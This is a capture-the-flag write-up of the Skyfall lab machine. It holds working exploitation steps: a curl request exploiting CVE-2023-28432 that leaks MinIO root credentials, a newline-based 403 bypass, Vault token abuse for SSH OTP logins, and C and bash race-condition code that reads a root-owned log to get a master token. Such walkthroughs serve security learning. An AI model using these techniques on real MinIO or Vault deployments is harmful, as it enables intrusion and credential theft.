Difficulty level : **Insane**

![](images/Pasted%20image%2020240826100602.png)
![](images/Pasted%20image%2020240826100621.png)


## **Synopsis**
Skyfall is an Insane level box. Here, we see that SSH and HTTP ports are open. By enumerating port 80, we get a static website for Skyfall. Through further enumeration, we discover a valid vhost. After bypassing a 403 endpoint, we find another vhost that has a vulnerability which can be exploited using CVE-2023-28432. Upon exploiting this vulnerability, we obtain Minio root credentials. From there, we access a backup folder. After careful enumeration, we find a HashiCorp Vault endpoint token, which allows us to get a user shell. For privilege escalation, we exploit a race condition vulnerability in Vault to obtain the admin token, ultimately gaining root access.

## **01 Enumeration

Starting with `nmap` to check the open ports:

```bash
# Nmap 7.94SVN scan initiated Tue Aug 27 09:52:30 2024 as: nmap -sC -sV -vv -p22,80 -oN nmap.txt 10.10.11.254
Nmap scan report for 10.10.11.254
Host is up, received echo-reply ttl 63 (0.40s latency).
Scanned at 2024-08-27 09:52:31 IST for 28s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCVqvI8vGs8EIUAAUiRze8kfKmYh9ETTUei3zRd1wWWLRBjSm+soBLfclIUP69cNtQOa961nyt2/BOwuR35cLR4=
|   256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINk0VgEkDNZoIJwcG5LEVZDZkEeSRHLBmAOtd/pduzRW
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
|_http-title: Skyfall - Introducing Sky Storage!
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 27 09:52:59 2024 -- 1 IP address (1 host up) scanned in 28.84 seconds
```

Nmap results shows us that only 2 ports are open:

1 - `Port 22` - SSH service is running and banner tells us that it an `Ubuntu` server.
2- `Port 80` - Default `HTTP` port and its banner tells us `nginx/1.18.0 (Ubuntu)` is running.

### **Port 80 Enumeration
Visiting the webpage:

![](images/Pasted%20image%2020240827100351.png)
![](images/Pasted%20image%2020240827100419.png)

After enumeration , its a `static website` and i found nothing interesting here and I don't find anything either in `source code`.

Here i did `dir enumeartion` but i did not find any endpoint so lets move on to VHOST enumeration.

#### VHOST Enumeration
```bash
ffuf -u http://10.10.11.254 --w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.skyfall.htb" -mc all -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.254
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.skyfall.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

demo                    [Status: 302, Size: 217, Words: 23, Lines: 1, Duration: 1195ms]
:: Progress: [4989/4989] :: Job [1/1] :: 91 req/sec :: Duration: [0:01:03] :: Errors: 0 ::
```

We get a valid `subdomain` lets add it to our host file:

Visiting the new webpage: http://demo.skyfall.htb/login

![](images/Pasted%20image%2020240827100742.png)

Its a login page and we also get `Demo login credentials` : **guest:guest**


![](images/Pasted%20image%2020240827102340.png)
![](images/Pasted%20image%2020240827102400.png)
![](images/Pasted%20image%2020240827102602.png)

Here http://demo.skyfall.htb/metrics this endpoint giving `403` error.

![](images/Pasted%20image%2020240827102618.png)

I enumerated the rest of the functionality but i don't find anything interesting here except this `metrices`  endpoint and `beta` endpoint , so i start bypassing those endpoints.

A simple 403 bypass worked to reveal the information of this page, here i get success by adding `%0A` (new-line) in metrices endpoint.

![](images/Pasted%20image%2020240827102938.png)

Here we can see **Minio** so i searched about it here is short description:

Minio is an open-source, high-performance, distributed object storage system. It is designed to be compatible with the Amazon S3 cloud storage service API, making it a popular choice for developers who want to build S3-compatible applications without relying on Amazon's infrastructure.

At the end part of the page i find a subdomain:http://prd23-s3-backend.skyfall.htb/
![](images/Pasted%20image%2020240827103046.png)

So i add it to my host file and visit the new subdomian.

![](images/Pasted%20image%2020240827103357.png)

and visiting the full endpoint:
![](images/Pasted%20image%2020240827103420.png)

So then i checked for `minio v2` exploit and i found  **CVE**-**2023**-**28432** in order to exploit i used this [link]([acheiii/CVE-2023-28432: CVE-2023-28432 POC (github.com)](https://github.com/acheiii/CVE-2023-28432))

MinIO is reported to have the CVE-2023-28432 vulnerability, which entails an information leak risk. Exploiting this vulnerability can result in the exposure of sensitive information.

### CVE-2023-28432 POC

Minio is a Multi-Cloud Object Storage framework. In a cluster deployment starting with RELEASE.2019-12-17T23-16-33Z and prior to RELEASE.2023-03-20T20-16-18Z, MinIO returns all environment variables, including `MINIO_SECRET_KEY` and `MINIO_ROOT_PASSWORD`, resulting in information disclosure. All users of distributed deployment are impacted. All users are advised to upgrade to RELEASE.2023-03-20T20-16-18Z.

### **Exploiting**

The exploit seems simple enough: perform a `POST` request to the Minio Endpoint at path `/minio/bootstrap/v1/verify`

So we can simply `curl` the request or we can use `Burp` as well as but i prefer `curl`.

```bash
curl -v -X POST http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify
* Host prd23-s3-backend.skyfall.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.254
*   Trying 10.10.11.254:80...
* Connected to prd23-s3-backend.skyfall.htb (10.10.11.254) port 80
> POST /minio/bootstrap/v1/verify HTTP/1.1
> Host: prd23-s3-backend.skyfall.htb
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 27 Aug 2024 05:15:39 GMT
< Content-Type: text/plain; charset=utf-8
< Content-Length: 1444
< Connection: keep-alive
< Content-Security-Policy: block-all-mixed-content
< Strict-Transport-Security: max-age=31536000; includeSubDomains
< Vary: Origin
< X-Amz-Id-2: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
< X-Amz-Request-Id: 17EF7E044B49AA09
< X-Content-Type-Options: nosniff
< X-Xss-Protection: 1; mode=block
< 
{"MinioEndpoints":[{"Legacy":false,"SetCount":1,"DrivesPerSet":4,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data1","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node1:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio-node2:9000","Path":"/data2","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false}],"CmdLine":"http://minio-node{1...2}/data{1...2}","Platform":"OS: linux | Arch: amd64"}],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_BROWSER":"off","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_PROMETHEUS_AUTH_TYPE":"public","MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key","MINIO_UPDATE":"off","MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"}}
* Connection #0 to host prd23-s3-backend.skyfall.htb left intact

```

Here we get interesting things lets have a clear look.

```bash
{
  "MinioEnv": {
    "MINIO_ACCESS_KEY_FILE": "access_key",
    "MINIO_BROWSER": "off",
    "MINIO_CONFIG_ENV_FILE": "config.env",
    "MINIO_KMS_SECRET_KEY_FILE": "kms_master_key",
    "MINIO_PROMETHEUS_AUTH_TYPE": "public",
    "MINIO_ROOT_PASSWORD": "GkpjkmiVmpFuL2d3oRx0",
    "MINIO_ROOT_PASSWORD_FILE": "secret_key",
    "MINIO_ROOT_USER": "5GrE1B2YGGyZzNHZaIww",
    "MINIO_ROOT_USER_FILE": "access_key",
    "MINIO_SECRET_KEY_FILE": "secret_key",
    "MINIO_UPDATE": "off",
    "MINIO_UPDATE_MINISIGN_PUBKEY": "RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"
  }
}
```

Here we get `MINIO_ROOT_USER and MINIO_ROOT_PASSWORD`

```
MINIO_ROOT_USER": 5GrE1B2YGGyZzNHZaIww
MINIO_ROOT_PASSWORD": GkpjkmiVmpFuL2d3oRx0
```

Now we find a way to communicate with `MinIo` in my Linux so after a quick search i get this 
https://min.io/docs/minio/linux/reference/minio-mc.html

![](images/Pasted%20image%2020240827105308.png)

## Installation command:

```bash
curl https://dl.min.io/client/mc/release/linux-amd64/mc --create-dirs -o $HOME/minio-binaries/mc

chmod +x $HOME/minio-binaries/mc

export PATH=$PATH:$HOME/minio-binaries/

```

After installation run it with proper credentials.

```bash
mc alias set skyfall http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0

mc: Configuration written to `/home/mindflare/.mc/config.json`. Please update your access credentials.
mc: Successfully created `/home/mindflare/.mc/share`.
mc: Initialized share uploads `/home/mindflare/.mc/share/uploads.json` file.
mc: Initialized share downloads `/home/mindflare/.mc/share/downloads.json` file.
Added `skyfall` successfully.
                                   
```

Now we want to list objects in a bucket named `skyfall`, including all versions of the objects.

```bash
mc ls -r --versions skyfall
```

![](images/Pasted%20image%2020240827110024.png)

So here i download all three `backup.tar.gz` files as they are of diff `version`

```bash
mc cp skyfall/askyy/home_backup.tar.gz --version-id 3c498578-8dfe-43b7-b679-32a3fe42018f .
```

Here `.` means that i want to download those files in my current dir.

![](images/Pasted%20image%2020240827110501.png)

Seems like they all are same :
![](images/Pasted%20image%2020240827110554.png)

here after enumerating i get info from visiting `.bashrc`

```bash
cat .bashrc
⋮
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="hvs.CAESI[REDACTED]"
⋮
```

Here we can see we get HashiCorp vault endpoint and vault key, Looking at vault’s [documentation](https://developer.hashicorp.com/vault/docs/commands), we see that we need to set two variables: `VAULT_TOKEN` and `VAULT_ADDR`. 

First add the new VHSOT in our etc host `prd23-vault-internal.skyfall.htb`

To install Vault we have to Download the Vault Binary First.

https://developer.hashicorp.com/vault/install

## **Installation Commands:**

```bash
curl -sLO https://releases.hashicorp.com/vault/1.17.2/vault_1.17.2_linux_amd64.zip

unzip vault_1.17.2_linux_amd64.zip
Archive:  vault_1.17.2_linux_amd64.zip
  inflating: vault
  inflating: LICENSE.txt

mv vault /usr/local/bin/

export VAULT_ADDR=http://prd23-vault-internal.skyfall.htb

vault login

Token (will be hidden):
WARNING! The VAULT_TOKEN environment variable is set! The value of this
variable will take precedence; if this is unwanted please unset VAULT_TOKEN or
update its value accordingly.

Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                hvs.CAESI[REDACTED]
token_accessor       rByv1coOBC9ITZpzqbDtTUm8
token_duration       431958h30m18s
token_renewable      true
token_policies       ["default" "developers"]
identity_policies    []
policies             ["default" "developers"]
```

Here we logged in successfully, lets enumerate:

```bash
vault help          
Usage: vault <command> [args]

Common commands:
    read        Read data and retrieves secrets
    write       Write data, configuration, and secrets
    delete      Delete secrets and configuration
    list        List data or secrets
    login       Authenticate locally
    agent       Start a Vault agent
    server      Start a Vault server
    status      Print seal and HA status
    unwrap      Unwrap a wrapped secret

Other commands:
    audit                Interact with audit devices
    auth                 Interact with auth methods
    debug                Runs the debug command
    events               
    hcp                  
    kv                   Interact with Vault's Key-Value storage
    lease                Interact with leases
    monitor              Stream log messages from a Vault server
    namespace            Interact with namespaces
    operator             Perform operator-specific tasks
    patch                Patch data, configuration, and secrets
    path-help            Retrieve API help for paths
    pki                  Interact with Vault's PKI Secrets Engine
    plugin               Interact with Vault plugins and catalog
    policy               Interact with policies
    print                Prints runtime configurations
    proxy                Start a Vault Proxy
    secrets              Interact with secrets engines
    ssh                  Initiate an SSH session
    token                Interact with tokens
    transform            Interact with Vault's Transform Secrets Engine
    transit              Interact with Vault's Transit Secrets Engine
    version-history      Prints the version history of the target Vault server

```

here `help` command give us a good idea and i researched about `vault` and i came to know that SSH credentials are placed on `ssh/roles` path in Vault.

```bash
┌──(mindflare㉿Mindflare)-[~/Desktop/SKyfall]
└─$ vault token capabilities ssh/roles
list

mindflare㉿Mindflare)-[~/Desktop/SKyfall]
└─$ vault list ssh/roles              
Keys
----
admin_otp_key_role
dev_otp_key_role

```

Here we get `admin_otp_key_role` Now i used `CHATPGPT` because  i have less idea of these `Keys` and i get info from there:

The `vault list ssh/roles` command lists the SSH roles that are configured within the Vault's SSH secrets engine. The roles you see, `admin_otp_key_role` and `dev_otp_key_role`, are associated with the SSH OTP (One-Time Password) method in Vault.

### Understanding the SSH OTP Method

- **SSH OTP Role**: The roles like `admin_otp_key_role` and `dev_otp_key_role` define the policies and settings for generating one-time passwords that can be used to log in to SSH servers.
- **OTP**: Vault generates a unique one-time password that you can use to log in to an SSH server for a single session. This password expires after a specified time or after it's used.

### Now there are 2 methods for logging in , and i wil show both methods:

**Method 1

1. Generating SSH OTP then logging in:

Use the `vault ssh` command to generate an OTP for the specified role:

```bash
vault write ssh/creds/dev_otp_key_role ip=10.10.11.254 username=askyy

Key                Value
---                -----
lease_id           ssh/creds/dev_otp_key_role/VNtkIyzsWMEDq08iTFvXl30W
lease_duration     768h
lease_renewable    false
ip                 10.10.11.254
key                ef9e12c2-6807-df44-a1c3-4ddded6563cd
key_type           otp
port               22
username           askyy
```

Here `key` is generated we can use this key to logged in:

Simply enter the key in password field:

```bash
ssh askyy@10.10.11.254

The authenticity of host '10.10.11.254 (10.10.11.254)' can't be established.
ED25519 key fingerprint is SHA256:mUK/F6yhenOEZEcLnWWWl3FVk3PiHC8ETKpL3Sz773c.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.254' (ED25519) to the list of known hosts.
(askyy@10.10.11.254) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
askyy@skyfall:~$ id
uid=1000(askyy) gid=1000(askyy) groups=1000(askyy)
```

**Method 2

2. Use Vault to automatically log in:

```bash
vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,                                                                                                                   
Vault can automatically perform this step for you.                                                                                                                                           
OTP for the session is: 1c884663-0052-56fb-999e-b463ad41a559
(askyy@10.10.11.254) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Aug 27 06:31:24 2024 from 10.10.16.15
askyy@skyfall:~$ cat user.txt
195ed86438230470fc223b00942486a5
```


## **Priv Esc

After Enumerating a little about system now its time for most common Priv Esc method checking `sudo -l`

```bash
askyy@skyfall:~$ sudo -l
Matching Defaults entries for askyy on skyfall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User askyy may run the following commands on skyfall:
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
```

Here we can see that we can run command with user priv.

```bash
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
Usage:
  vault-unseal [OPTIONS]

Application Options:
  -v, --verbose        enable verbose output
  -d, --debug          enable debugging output to file (extra logging)
  -c, --config=PATH    path to configuration file

Help Options:
  -h, --help           Show this help message
```

Here by using `help` command we get a idea about this.

```bash
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
```

![](images/Pasted%20image%2020240827121742.png)

We can see a `debug.log` file has been generated lets check this file.

When we try to open this file we get `Permission denied error`

```bash
askyy@skyfall:~/test$ ls -la
total 12
drwxrwxr-x 2 askyy askyy 4096 Aug 27 06:59 .
drwxr-x--- 6 askyy askyy 4096 Aug 27 06:58 ..
-rw------- 1 root  root   590 Aug 27 06:59 debug.log
```

Only root has permission , so here after a lot of research i find that the vault-unseal is vulnerable to race conditions. The program will remove any debug.log file, after that it will run some processes to unseal the vault and after it’s done it will store the output on debug.log.

Let’s exploit the race condition. This is the C code used.

```bash
#include <unistd.h>  
#include <fcntl.h>

#define FILENAME "debug.log"

int main() {  
int fd;

// Infinite loop to continuously try to create the file  
while (1) {  
// Attempt to create the file with O_CREAT and O_EXCL flags  
fd = open(FILENAME, O_CREAT | O_EXCL, 0644);  
if (fd != -1) {  
close(fd); // Close the file and keep looping  
}  
}
return 0; // This line will never be reached due to the infinite loop  
}
```

Now compile the code with `gcc` and send it to our box.

```bash
 gcc -o racecondition race_exploit.c
```

To exploit this race condition, you'll need to run two processes simultaneously: one to execute the vault-unseal command and another to run your exploit code.

### Open two SSH connections to the target machine:

**In SSH Connection 1, navigate to the directory where you uploaded the race_exploit binary and make it executable:**

```bash
chmod +x racecondition
```

In SSH Connection 2, prepare the command to run vault-unseal:

```bash
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
```

- Now, you'll need to coordinate the execution of both processes:
    - In SSH Connection 1, start the race_exploit:
        
        Copy
        
        `./race_exploit`
        
    - Quickly switch to SSH Connection 2 and run the vault-unseal command:
        
        Copy
        
        `sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d`
        
- Let both processes run for a short while, then stop them (you can use Ctrl+C in both terminals).

But it did not work for me in this case so i made a simple bash script for this:

```bash
#!/bin/bash

# Start the race condition exploit in the background
./racecondition &

# Small sleep to ensure the racecondition program has started
sleep 0.1

# Run the vault-unseal command
sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd

# Wait a bit
sleep 1

# Try to read the debug.log file
cat debug.log

# Clean up
killall racecondition
```

Then i run the exploit:

```bash
askyy@skyfall:~$ chmod +x exploit.sh
askyy@skyfall:~$ ./exploit.sh 
[+] Reading: /etc/vault-unseal.yaml
[-] Security Risk!
[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
[>] Check interval: 5s
[>] Max checks: 5
[>] Checking seal status
[+] Vault sealed: false
2024/08/27 07:42:37 Initializing logger...
2024/08/27 07:42:37 Reading: /etc/vault-unseal.yaml
2024/08/27 07:42:37 Security Risk!
2024/08/27 07:42:37 Master token found in config: hvs.I0ew[REDACTED]
2024/08/27 07:42:37 Found Vault node: http://prd23-vault-internal.skyfall.htb
2024/08/27 07:42:37 Check interval: 5s
2024/08/27 07:42:37 Max checks: 5
2024/08/27 07:42:37 Establishing connection to Vault...
2024/08/27 07:42:37 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
2024/08/27 07:42:37 Checking seal status
2024/08/27 07:42:37 Vault sealed: false
./exploit.sh: line 19: killall: command not found
askyy@skyfall:~$ exit
logout
```

Here we get our `Master token` : hvs.I0ew[REDACTED]

Export the `master token`:

```bash
export VAULT_TOKEN=hvs.I0ew[REDACTED]
```

```bash
vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.10.11.254
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,                                                                                                                   
Vault can automatically perform this step for you.                                                                                                                                           
OTP for the session is: 296f6ea3-3520-26c3-eef5-e86aa3313e6c
(root@10.10.11.254) Password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Wed Mar 27 13:20:05 2024 from 10.10.14.46
root@skyfall:~# id
uid=0(root) gid=0(root) groups=0(root)
root@skyfall:~# ls
minio  root.txt  sky_storage  vault
root@skyfall:~# cat root.txt 
d7b795fa521ad28697c24c094de230a3
```

Here we get root!

# Conclusion

In this box, we gained extensive knowledge about MinIO’s storage and HashiCorp Vault. We successfully bypassed a 403 page at `http://demo.skyfall.htb` to uncover an S3 bucket MinIO’s storage endpoint, which we interacted with using the MinIO Client. Within this storage, we discovered a backup file containing another endpoint, this time corresponding to HashiCorp Vault, along with a Vault Token. This token allowed us to generate an OTP that granted us access as the user `askyy`.

Subsequently, we escalated our privileges by utilizing `sudo -l` and exploiting file ownership to read the contents of the `debug.log` file, in order to see the contents we then exploit the race condition.

Finally, armed with the master token, we were able to create an OTP for the root user, ultimately granting us access to the root shell.
